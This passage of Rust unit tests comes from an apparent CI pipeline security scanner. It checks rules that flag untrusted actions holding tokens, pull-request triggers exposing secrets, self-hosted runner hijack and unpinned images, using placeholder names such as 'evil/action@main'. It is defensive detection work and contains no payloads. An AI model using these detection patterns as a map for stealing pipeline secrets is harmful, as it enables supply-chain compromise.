        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_CONTAINER.into(), "true".into());
        g.add_node_with_metadata(NodeKind::Image, "ubuntu:22.04", TrustZone::Untrusted, meta);

        let findings = floating_image(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].category, FindingCategory::FloatingImage);
        assert_eq!(findings[0].severity, Severity::Medium);
    }

    #[test]
    fn partial_graph_preserves_critical_findings() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.mark_partial(
            GapKind::Expression,
            "matrix strategy hides some authority paths",
        );

        // A matrix expression hides values but doesn't break graph structure,
        // so the gap is Expression (the lowest-severity GapKind).
        assert_eq!(
            g.completeness_gap_kinds,
            vec![GapKind::Expression],
            "matrix-strategy gap must be classified as Expression"
        );

        let identity = g.add_node(NodeKind::Identity, "GITHUB_TOKEN", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::Untrusted);
        let image = g.add_node(NodeKind::Image, "evil/action@main", TrustZone::Untrusted);

        g.add_edge(step, identity, EdgeKind::HasAccessTo);
        g.add_edge(step, image, EdgeKind::UsesImage);

        let findings = run_all_rules(&g, 4);
        assert!(findings
            .iter()
            .any(|f| f.category == FindingCategory::AuthorityPropagation));
        assert!(findings
            .iter()
            .any(|f| f.category == FindingCategory::UntrustedWithAuthority));
        assert!(
            findings.iter().any(|f| f.severity == Severity::Critical),
            "partial graph completeness must not down-rank critical findings"
        );
    }

    #[test]
    fn unknown_graph_preserves_critical_findings() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.completeness = crate::graph::AuthorityCompleteness::Unknown;

        let identity = g.add_node(NodeKind::Identity, "GITHUB_TOKEN", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::Untrusted);
        let image = g.add_node(NodeKind::Image, "evil/action@main", TrustZone::Untrusted);

        g.add_edge(step, identity, EdgeKind::HasAccessTo);
        g.add_edge(step, image, EdgeKind::UsesImage);

        let findings = run_all_rules(&g, 4);
        assert!(
            findings.iter().any(|f| f.severity == Severity::Critical),
            "unknown graph completeness must not down-rank critical findings"
        );
    }

    #[test]
    fn complete_graph_keeps_critical_findings() {
        let mut g = AuthorityGraph::new(source("ci.yml"));

        let identity = g.add_node(NodeKind::Identity, "GITHUB_TOKEN", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::Untrusted);
        let image = g.add_node(NodeKind::Image, "evil/action@main", TrustZone::Untrusted);

        g.add_edge(step, identity, EdgeKind::HasAccessTo);
        g.add_edge(step, image, EdgeKind::UsesImage);

        let findings = run_all_rules(&g, 4);
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn floating_image_digest_pinned_container_not_flagged() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_CONTAINER.into(), "true".into());
        g.add_node_with_metadata(
            NodeKind::Image,
            "ubuntu@sha256:a5ac7e51b41094c92402da3b24376905380afc29a5ac7e51b41094c92402da3b",
            TrustZone::ThirdParty,
            meta,
        );

        let findings = floating_image(&g);
        assert!(
            findings.is_empty(),
            "digest-pinned container should not be flagged"
        );
    }

    #[test]
    fn unpinned_action_does_not_flag_container_images() {
        // Regression: container Image nodes are handled by floating_image, not unpinned_action.
        // The same node must not generate findings from both rules.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_CONTAINER.into(), "true".into());
        g.add_node_with_metadata(NodeKind::Image, "ubuntu:22.04", TrustZone::Untrusted, meta);

        let findings = unpinned_action(&g);
        assert!(
            findings.is_empty(),
            "unpinned_action must skip container images to avoid double-flagging"
        );
    }

    #[test]
    fn floating_image_ignores_action_images() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        // Image node without META_CONTAINER — this is a step uses: action, not a container
        g.add_node(NodeKind::Image, "actions/checkout@v4", TrustZone::Untrusted);

        let findings = floating_image(&g);
        assert!(
            findings.is_empty(),
            "floating_image should not flag step actions"
        );
    }

    #[test]
    fn persisted_credential_rule_fires_on_persists_to_edge() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let token = g.add_node(
            NodeKind::Identity,
            "System.AccessToken",
            TrustZone::FirstParty,
        );
        let checkout = g.add_node(NodeKind::Step, "checkout", TrustZone::FirstParty);
        g.add_edge(checkout, token, EdgeKind::PersistsTo);

        let findings = persisted_credential(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].category, FindingCategory::PersistedCredential);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].message.contains("persistCredentials"));
    }

    #[test]
    fn untrusted_with_cli_flag_exposed_secret_notes_log_exposure() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let step = g.add_node(NodeKind::Step, "TerraformCLI@0", TrustZone::Untrusted);
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_CLI_FLAG_EXPOSED.into(), "true".into());
        let secret =
            g.add_node_with_metadata(NodeKind::Secret, "db_password", TrustZone::FirstParty, meta);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = untrusted_with_authority(&g);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0].message.contains("-var flag"),
            "message should note -var flag log exposure"
        );
        assert!(matches!(
            findings[0].recommendation,
            Recommendation::Manual { .. }
        ));
    }

    #[test]
    fn constrained_identity_scope_not_flagged() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_PERMISSIONS.into(), "{ contents: read }".into());
        meta.insert(META_IDENTITY_SCOPE.into(), "constrained".into());
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "GITHUB_TOKEN",
            TrustZone::FirstParty,
            meta,
        );
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, identity, EdgeKind::HasAccessTo);

        let findings = over_privileged_identity(&g);
        assert!(
            findings.is_empty(),
            "constrained scope should not be flagged"
        );
    }

    #[test]
    fn trigger_context_mismatch_fires_on_pull_request_target_with_secret() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request_target".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = trigger_context_mismatch(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(
            findings[0].category,
            FindingCategory::TriggerContextMismatch
        );
    }

    #[test]
    fn trigger_context_mismatch_no_fire_without_trigger_metadata() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = trigger_context_mismatch(&g);
        assert!(findings.is_empty(), "no trigger metadata → no finding");
    }

    #[test]
    fn cross_workflow_authority_chain_detected() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        let external = g.add_node(
            NodeKind::Image,
            "evil/workflow.yml@main",
            TrustZone::Untrusted,
        );
        g.add_edge(step, secret, EdgeKind::HasAccessTo);
        g.add_edge(step, external, EdgeKind::DelegatesTo);

        let findings = cross_workflow_authority_chain(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(
            findings[0].category,
            FindingCategory::CrossWorkflowAuthorityChain
        );
    }

    #[test]
    fn cross_workflow_authority_chain_no_fire_if_local_delegation() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        let local = g.add_node(NodeKind::Image, "./local-action", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);
        g.add_edge(step, local, EdgeKind::DelegatesTo);

        let findings = cross_workflow_authority_chain(&g);
        assert!(
            findings.is_empty(),
            "FirstParty delegation should not be flagged"
        );
    }

    #[test]
    fn authority_cycle_detected() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let a = g.add_node(NodeKind::Step, "A", TrustZone::FirstParty);
        let b = g.add_node(NodeKind::Step, "B", TrustZone::FirstParty);
        g.add_edge(a, b, EdgeKind::DelegatesTo);
        g.add_edge(b, a, EdgeKind::DelegatesTo);

        let findings = authority_cycle(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].category, FindingCategory::AuthorityCycle);
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn authority_cycle_no_fire_for_acyclic_graph() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let a = g.add_node(NodeKind::Step, "A", TrustZone::FirstParty);
        let b = g.add_node(NodeKind::Step, "B", TrustZone::FirstParty);
        let c = g.add_node(NodeKind::Step, "C", TrustZone::FirstParty);
        g.add_edge(a, b, EdgeKind::DelegatesTo);
        g.add_edge(b, c, EdgeKind::DelegatesTo);

        let findings = authority_cycle(&g);
        assert!(findings.is_empty(), "acyclic graph must not fire");
    }

    #[test]
    fn uplift_without_attestation_fires_when_oidc_no_attests() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_OIDC.into(), "true".into());
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "AWS/deploy-role",
            TrustZone::FirstParty,
            meta,
        );
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, identity, EdgeKind::HasAccessTo);

        let findings = uplift_without_attestation(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Info);
        assert_eq!(
            findings[0].category,
            FindingCategory::UpliftWithoutAttestation
        );
    }

    #[test]
    fn uplift_without_attestation_no_fire_when_attests_present() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut id_meta = std::collections::HashMap::new();
        id_meta.insert(META_OIDC.into(), "true".into());
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "AWS/deploy-role",
            TrustZone::FirstParty,
            id_meta,
        );
        let mut step_meta = std::collections::HashMap::new();
        step_meta.insert(META_ATTESTS.into(), "true".into());
        let attest_step =
            g.add_node_with_metadata(NodeKind::Step, "attest", TrustZone::FirstParty, step_meta);
        let build_step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(build_step, identity, EdgeKind::HasAccessTo);
        // Touch attest_step so the variable is used (avoid unused warning)
        let _ = attest_step;

        let findings = uplift_without_attestation(&g);
        assert!(findings.is_empty(), "attestation present → no finding");
    }

    #[test]
    fn uplift_without_attestation_no_fire_without_oidc() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_PERMISSIONS.into(), "write-all".into());
        meta.insert(META_IDENTITY_SCOPE.into(), "broad".into());
        // Note: no META_OIDC
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "GITHUB_TOKEN",
            TrustZone::FirstParty,
            meta,
        );
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, identity, EdgeKind::HasAccessTo);

        let findings = uplift_without_attestation(&g);
        assert!(
            findings.is_empty(),
            "broad identity without OIDC must not fire"
        );
    }

    #[test]
    fn self_mutating_pipeline_untrusted_is_critical() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_WRITES_ENV_GATE.into(), "true".into());
        g.add_node_with_metadata(NodeKind::Step, "fork-step", TrustZone::Untrusted, meta);

        let findings = self_mutating_pipeline(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(findings[0].category, FindingCategory::SelfMutatingPipeline);
    }

    #[test]
    fn self_mutating_pipeline_privileged_step_is_high() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_WRITES_ENV_GATE.into(), "true".into());
        let step = g.add_node_with_metadata(NodeKind::Step, "build", TrustZone::FirstParty, meta);
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = self_mutating_pipeline(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn trigger_context_mismatch_fires_on_ado_pr_with_secret_as_high() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        g.metadata.insert(META_TRIGGER.into(), "pr".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = trigger_context_mismatch(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(
            findings[0].category,
            FindingCategory::TriggerContextMismatch
        );
    }

    #[test]
    fn cross_workflow_authority_chain_third_party_is_high() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        // ThirdParty target (SHA-pinned external workflow)
        let external = g.add_node(
            NodeKind::Image,
            "org/repo/.github/workflows/deploy.yml@a5ac7e51b41094c92402da3b24376905380afc29",
            TrustZone::ThirdParty,
        );
        g.add_edge(step, secret, EdgeKind::HasAccessTo);
        g.add_edge(step, external, EdgeKind::DelegatesTo);

        let findings = cross_workflow_authority_chain(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "ThirdParty delegation target should be High (Critical reserved for Untrusted)"
        );
        assert_eq!(
            findings[0].category,
            FindingCategory::CrossWorkflowAuthorityChain
        );
    }

    #[test]
    fn self_mutating_pipeline_first_party_no_authority_is_medium() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_WRITES_ENV_GATE.into(), "true".into());
        // FirstParty step writes the gate but holds no secret/identity access.
        g.add_node_with_metadata(NodeKind::Step, "set-version", TrustZone::FirstParty, meta);

        let findings = self_mutating_pipeline(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(findings[0].category, FindingCategory::SelfMutatingPipeline);
    }

    #[test]
    fn authority_cycle_3node_cycle_includes_all_members() {
        // A → B → C → A should produce one finding whose nodes_involved
        // contains all three node IDs, not just the back-edge endpoints.
        let mut g = AuthorityGraph::new(source("test.yml"));
        let a = g.add_node(NodeKind::Step, "A", TrustZone::FirstParty);
        let b = g.add_node(NodeKind::Step, "B", TrustZone::FirstParty);
        let c = g.add_node(NodeKind::Step, "C", TrustZone::FirstParty);
        g.add_edge(a, b, EdgeKind::DelegatesTo);
        g.add_edge(b, c, EdgeKind::DelegatesTo);
        g.add_edge(c, a, EdgeKind::DelegatesTo);

        let findings = authority_cycle(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].category, FindingCategory::AuthorityCycle);
        assert!(
            findings[0].nodes_involved.contains(&a),
            "A must be in nodes_involved"
        );
        assert!(
            findings[0].nodes_involved.contains(&b),
            "B must be in nodes_involved — middle of A→B→C→A cycle"
        );
        assert!(
            findings[0].nodes_involved.contains(&c),
            "C must be in nodes_involved"
        );
    }

    #[test]
    fn variable_group_in_pr_job_fires_on_pr_trigger_with_var_group() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        g.metadata.insert(META_TRIGGER.into(), "pr".into());
        let mut secret_meta = std::collections::HashMap::new();
        secret_meta.insert(META_VARIABLE_GROUP.into(), "true".into());
        let secret = g.add_node_with_metadata(
            NodeKind::Secret,
            "prod-deploy-secrets",
            TrustZone::FirstParty,
            secret_meta,
        );
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = variable_group_in_pr_job(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(findings[0].category, FindingCategory::VariableGroupInPrJob);
        assert!(findings[0].message.contains("prod-deploy-secrets"));
    }

    #[test]
    fn variable_group_in_pr_job_no_fire_without_pr_trigger() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        // No trigger metadata — should not fire
        let mut secret_meta = std::collections::HashMap::new();
        secret_meta.insert(META_VARIABLE_GROUP.into(), "true".into());
        let secret = g.add_node_with_metadata(
            NodeKind::Secret,
            "prod-deploy-secrets",
            TrustZone::FirstParty,
            secret_meta,
        );
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = variable_group_in_pr_job(&g);
        assert!(
            findings.is_empty(),
            "no PR trigger → variable_group_in_pr_job must not fire"
        );
    }

    #[test]
    fn variable_group_in_pr_job_no_fire_when_pr_none() {
        // Regression for Bug 1: pr: none in ADO means no PR trigger — the parser
        // must not set META_TRIGGER, so variable_group_in_pr_job must not fire.
        // This test validates at the rule level: no META_TRIGGER → no firing.
        let mut g = AuthorityGraph::new(source("weekly-report.yml"));
        // No META_TRIGGER inserted — mirrors what the parser produces for pr: none.
        let mut secret_meta = std::collections::HashMap::new();
        secret_meta.insert(META_VARIABLE_GROUP.into(), "true".into());
        let secret = g.add_node_with_metadata(
            NodeKind::Secret,
            "ado-report-secrets",
            TrustZone::FirstParty,
            secret_meta,
        );
        let step = g.add_node(NodeKind::Step, "report-step", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = variable_group_in_pr_job(&g);
        assert!(
            findings.is_empty(),
            "pr: none (no META_TRIGGER) → variable_group_in_pr_job must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn self_hosted_pool_pr_hijack_fires_when_all_three_factors_present() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        g.metadata.insert(META_TRIGGER.into(), "pr".into());

        let mut pool_meta = std::collections::HashMap::new();
        pool_meta.insert(META_SELF_HOSTED.into(), "true".into());
        g.add_node_with_metadata(
            NodeKind::Image,
            "self-hosted-pool",
            TrustZone::FirstParty,
            pool_meta,
        );

        let mut step_meta = std::collections::HashMap::new();
        step_meta.insert(META_CHECKOUT_SELF.into(), "true".into());
        g.add_node_with_metadata(NodeKind::Step, "checkout", TrustZone::FirstParty, step_meta);

        let findings = self_hosted_pool_pr_hijack(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(
            findings[0].category,
            FindingCategory::SelfHostedPoolPrHijack
        );
        assert!(findings[0].message.contains("self-hosted"));
    }

    #[test]
    fn self_hosted_pool_pr_hijack_no_fire_without_pr_trigger() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        // No trigger metadata

        let mut pool_meta = std::collections::HashMap::new();
        pool_meta.insert(META_SELF_HOSTED.into(), "true".into());
        g.add_node_with_metadata(
            NodeKind::Image,
            "self-hosted-pool",
            TrustZone::FirstParty,
            pool_meta,
        );

        let mut step_meta = std::collections::HashMap::new();
        step_meta.insert(META_CHECKOUT_SELF.into(), "true".into());
        g.add_node_with_metadata(NodeKind::Step, "checkout", TrustZone::FirstParty, step_meta);

        let findings = self_hosted_pool_pr_hijack(&g);
        assert!(
            findings.is_empty(),
            "no PR trigger → self_hosted_pool_pr_hijack must not fire"
        );
    }

    #[test]
    fn service_connection_scope_mismatch_fires_on_pr_broad_non_oidc() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        g.metadata.insert(META_TRIGGER.into(), "pr".into());

        let mut sc_meta = std::collections::HashMap::new();
        sc_meta.insert(META_SERVICE_CONNECTION.into(), "true".into());
        sc_meta.insert(META_IDENTITY_SCOPE.into(), "broad".into());
        // No META_OIDC → treated as not OIDC-federated
        let sc = g.add_node_with_metadata(
            NodeKind::Identity,
            "prod-azure-sc",
            TrustZone::FirstParty,
            sc_meta,
        );
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        g.add_edge(step, sc, EdgeKind::HasAccessTo);

        let findings = service_connection_scope_mismatch(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(
            findings[0].category,
            FindingCategory::ServiceConnectionScopeMismatch
        );
        assert!(findings[0].message.contains("prod-azure-sc"));
    }

    #[test]
    fn service_connection_scope_mismatch_no_fire_without_pr_trigger() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        // No trigger metadata
        let mut sc_meta = std::collections::HashMap::new();
        sc_meta.insert(META_SERVICE_CONNECTION.into(), "true".into());
        sc_meta.insert(META_IDENTITY_SCOPE.into(), "broad".into());
        let sc = g.add_node_with_metadata(
            NodeKind::Identity,
            "prod-azure-sc",
            TrustZone::FirstParty,
            sc_meta,
        );
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        g.add_edge(step, sc, EdgeKind::HasAccessTo);

        let findings = service_connection_scope_mismatch(&g);
        assert!(
            findings.is_empty(),
            "no PR trigger → service_connection_scope_mismatch must not fire"
        );
    }

    #[test]
    fn checkout_self_pr_exposure_fires_on_pr_trigger() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        g.metadata.insert(META_TRIGGER.into(), "pr".into());
        let mut step_meta = std::collections::HashMap::new();
        step_meta.insert(META_CHECKOUT_SELF.into(), "true".into());
        g.add_node_with_metadata(NodeKind::Step, "checkout", TrustZone::FirstParty, step_meta);

        let findings = checkout_self_pr_exposure(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::CheckoutSelfPrExposure
        );
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn checkout_self_pr_exposure_no_fire_without_pr_trigger() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        // No META_TRIGGER set
        let mut step_meta = std::collections::HashMap::new();
        step_meta.insert(META_CHECKOUT_SELF.into(), "true".into());
        g.add_node_with_metadata(NodeKind::Step, "checkout", TrustZone::FirstParty, step_meta);

        let findings = checkout_self_pr_exposure(&g);
        assert!(
            findings.is_empty(),
            "no PR trigger → checkout_self_pr_exposure must not fire"
        );
    }

    #[test]
    fn variable_group_in_pr_job_uses_cellos_remediation() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        g.metadata.insert(META_TRIGGER.into(), "pr".into());

        let mut secret_meta = std::collections::HashMap::new();
        secret_meta.insert(META_VARIABLE_GROUP.into(), "true".into());
        let secret = g.add_node_with_metadata(
            NodeKind::Secret,
            "prod-secret",
            TrustZone::FirstParty,
            secret_meta,
        );
        let step = g.add_node(NodeKind::Step, "deploy step", TrustZone::Untrusted);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = variable_group_in_pr_job(&g);
        assert!(!findings.is_empty());
        assert!(
            matches!(
                findings[0].recommendation,
                Recommendation::CellosRemediation { .. }
            ),
            "variable_group_in_pr_job must recommend CellosRemediation"
        );
    }

    #[test]
    fn service_connection_scope_mismatch_uses_cellos_remediation() {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        g.metadata.insert(META_TRIGGER.into(), "pr".into());

        let mut id_meta = std::collections::HashMap::new();
        id_meta.insert(META_SERVICE_CONNECTION.into(), "true".into());
        id_meta.insert(META_IDENTITY_SCOPE.into(), "broad".into());
        // No META_OIDC → treated as not OIDC-federated
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "sub-conn",
            TrustZone::FirstParty,
            id_meta,
        );
        let step = g.add_node(NodeKind::Step, "azure deploy", TrustZone::Untrusted);
        g.add_edge(step, identity, EdgeKind::HasAccessTo);

        let findings = service_connection_scope_mismatch(&g);
        assert!(!findings.is_empty());
        assert!(
            matches!(
                findings[0].recommendation,
                Recommendation::CellosRemediation { .. }
            ),
            "service_connection_scope_mismatch must recommend CellosRemediation"
        );
    }

    /// Build a propagation graph with an optional approval-gated middle step:
    ///   Secret → middle Step (FirstParty) → Artifact → ThirdParty Step.
    /// When `gated` is true the middle step carries META_ENV_APPROVAL.
    fn build_env_approval_graph(gated: bool) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));

        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        let mut middle_meta = std::collections::HashMap::new();
        if gated {
            middle_meta.insert(META_ENV_APPROVAL.into(), "true".into());
        }
        let middle = g.add_node_with_metadata(
            NodeKind::Step,
            "deploy-prod",
            TrustZone::FirstParty,
            middle_meta,
        );
        let artifact = g.add_node(NodeKind::Artifact, "release.tar", TrustZone::FirstParty);
        let third = g.add_node(
            NodeKind::Step,
            "third-party/uploader",
            TrustZone::ThirdParty,
        );

        g.add_edge(middle, secret, EdgeKind::HasAccessTo);
        g.add_edge(middle, artifact, EdgeKind::Produces);
        g.add_edge(artifact, third, EdgeKind::Consumes);

        g
    }

    #[test]
    fn env_approval_gate_reduces_propagation_severity() {
        // Baseline: no gate → Critical (third-party sink, not SHA-pinned)
        let baseline = authority_propagation(&build_env_approval_graph(false), 4);
        let baseline_finding = baseline
            .iter()
            .find(|f| f.category == FindingCategory::AuthorityPropagation)
            .expect("baseline must produce an AuthorityPropagation finding");
        assert_eq!(baseline_finding.severity, Severity::Critical);
        assert!(!baseline_finding
            .message
            .contains("environment approval gate"));

        // Gated: same shape, middle step tagged → severity drops one step to High
        let gated = authority_propagation(&build_env_approval_graph(true), 4);
        let gated_finding = gated
            .iter()
            .find(|f| f.category == FindingCategory::AuthorityPropagation)
            .expect("gated must produce an AuthorityPropagation finding");
        assert_eq!(
            gated_finding.severity,
            Severity::High,
            "Critical must downgrade to High when path crosses an env-approval gate"
        );
        assert!(
            gated_finding
                .message
                .contains("(mitigated: environment approval gate)"),
            "gated finding must annotate the mitigation in its message"
        );
    }

    #[test]
    fn downgrade_one_step_table() {
        assert_eq!(downgrade_one_step(Severity::Critical), Severity::High);
        assert_eq!(downgrade_one_step(Severity::High), Severity::Medium);
        assert_eq!(downgrade_one_step(Severity::Medium), Severity::Low);
        assert_eq!(downgrade_one_step(Severity::Low), Severity::Low);
        assert_eq!(downgrade_one_step(Severity::Info), Severity::Info);
    }

    // ── template_extends_unpinned_branch ──────────────────────

    /// Build a graph whose META_REPOSITORIES carries a single repo descriptor.
    /// `git_ref` of `None` encodes the "no `ref:` field" case (default branch).
    fn graph_with_repo(
        alias: &str,
        repo_type: &str,
        name: &str,
        git_ref: Option<&str>,
        used: bool,
    ) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        let mut obj = serde_json::Map::new();
        obj.insert("alias".into(), serde_json::Value::String(alias.into()));
        obj.insert(
            "repo_type".into(),
            serde_json::Value::String(repo_type.into()),
        );
        obj.insert("name".into(), serde_json::Value::String(name.into()));
        if let Some(r) = git_ref {
            obj.insert("ref".into(), serde_json::Value::String(r.into()));
        }
        obj.insert("used".into(), serde_json::Value::Bool(used));
        let arr = serde_json::Value::Array(vec![serde_json::Value::Object(obj)]);
        g.metadata.insert(
            META_REPOSITORIES.into(),
            serde_json::to_string(&arr).unwrap(),
        );
        g
    }

    // ── vm_remote_exec_via_pipeline_secret ──────────────

    /// Helper: build a graph with one Step that has the given inline script
    /// body and (optionally) a HasAccessTo edge to a Secret named `sas_var`.
    fn graph_with_script_step(body: &str, secret_name: Option<&str>) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("ado.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_SCRIPT_BODY.into(), body.into());
        let step_id =
            g.add_node_with_metadata(NodeKind::Step, "deploy-vm", TrustZone::FirstParty, meta);
        if let Some(name) = secret_name {
            let sec = g.add_node(NodeKind::Secret, name, TrustZone::FirstParty);
            g.add_edge(step_id, sec, EdgeKind::HasAccessTo);
        }
        g
    }

    // ── secret_to_inline_script_env_export ────────────────────

    /// Build a graph with one Step that has access to `secret_name` and
    /// stamps `script` as the META_SCRIPT_BODY.
    fn build_step_with_script(secret_name: &str, script: &str) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("ado.yml"));
        let secret = g.add_node(NodeKind::Secret, secret_name, TrustZone::FirstParty);
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_SCRIPT_BODY.into(), script.into());
        let step = g.add_node_with_metadata(NodeKind::Step, "deploy", TrustZone::FirstParty, meta);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);
        g
    }

    #[test]
    fn template_extends_unpinned_branch_fires_on_missing_ref() {
        let g = graph_with_repo(
            "template-library",
            "git",
            "Template Library/Library",
            None,
            true,
        );
        let findings = template_extends_unpinned_branch(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::TemplateExtendsUnpinnedBranch
        );
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].message.contains("default branch"));
    }

    #[test]
    fn template_extends_unpinned_branch_fires_on_refs_heads_main() {
        let g = graph_with_repo(
            "templates",
            "git",
            "org/templates",
            Some("refs/heads/main"),
            true,
        );
        let findings = template_extends_unpinned_branch(&g);
